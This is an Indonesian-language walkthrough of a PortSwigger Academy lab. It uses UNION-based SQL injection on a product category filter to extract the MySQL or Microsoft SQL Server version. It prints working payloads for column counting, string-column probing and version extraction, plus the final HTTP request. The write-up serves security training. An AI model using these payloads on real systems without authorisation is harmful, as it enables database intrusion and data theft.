# [PortSwigger Academy] SQL Injection - Lab #4

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection attack, querying the database type and version on MySQL and Microsoft
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan serangan UNION-Based SQLi untuk mengekstrak informasi tipe dan versi database pada sistem yang menggunakan MySQL atau Microsoft SQL Server.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah terjadi pada fitur filter kategori produk. Kita akan menggunakan operator `UNION` untuk menyisipkan kueri tambahan guna mengekstrak informasi versi database dari sistem.

### Karakteristik MySQL dan Microsoft (MSSQL):
1. **Klausa `FROM` Tidak Wajib:** Berbeda dengan Oracle, baik MySQL maupun MSSQL mengizinkan perintah `SELECT` langsung tanpa harus menyebutkan nama tabel (tidak perlu tabel tiruan seperti `DUAL`).
2. **Kueri Versi:** * **MySQL:** Menggunakan fungsi `@@version` atau `version()`.
   * **MSSQL:** Menggunakan variabel global `@@version`.
3. **Karakter Komentar (Comment):** * **MSSQL:** Menggunakan tanda hubung ganda `--`.
   * **MySQL:** Menggunakan tanda `-- ` (perhatikan **wajib ada spasi** setelah tanda hubung kedua). Di dalam URL, spasi ini harus di-encode menjadi tanda tambah (`+`) atau `%20`, sehingga menjadi `--+` atau `--%20`.

---

## 2. Langkah Eksploitasi & PoC

### Menentukan Jumlah Kolom Kueri Asli
Saya menggunakan teknik `ORDER BY` pada parameter kategori untuk mengetahui jumlah kolom yang dikembalikan oleh kueri asli:

* `category=Gifts' ORDER BY 1--+` (Status: 200 OK)
* `category=Gifts' ORDER BY 2--+` (Status: 200 OK)
* `category=Gifts' ORDER BY 3--+` (Status: 500 Internal Server Error)

**Analisis:** Karena `ORDER BY 3` menghasilkan error, ini membuktikan bahwa kueri asli backend mengembalikan **2 kolom**.

### Menentukan Tipe Data Kolom (Mencari Kolom String)
Kita harus memastikan kolom tersebut menerima tipe data teks (String) agar bisa menampung informasi versi database:

* `category=Gifts' UNION SELECT 'a', 'b'--+`

**Analisis:** Aplikasi merespons dengan status 200 OK dan menampilkan karakter 'a' dan 'b' pada halaman web. Ini membuktikan **kedua kolom menerima tipe data string**.

### Injeksi Payload Eksfiltrasi Data (MySQL / MSSQL Version)
Karena kedua kolom menerima string, kita bisa memasukkan variabel `@@version` pada kolom pertama dan mengisi kolom kedua dengan nilai `NULL` sebagai penyeimbang:

* **Payload:** `' UNION SELECT @@version, NULL#` atau `' UNION SELECT @@version, NULL--+`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Gifts' UNION SELECT @@version, NULL--+ HTTP/2
Host: 0a60002e030d77b580711279001100a2.web-security-academy.net
```

### Hasil Eksekusi Database
Di sisi database backend (asumsi MySQL), kueri dimanipulasi menjadi:
```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT @@version, NULL-- ' AND released = 1
```
Hasil Akhir: Aplikasi menampilkan teks versi database (misalnya: 8.0.x-log untuk MySQL atau informasi spesifik edisi Microsoft SQL Server) pada layar. Lab berhasil diselesaikan (Solved)
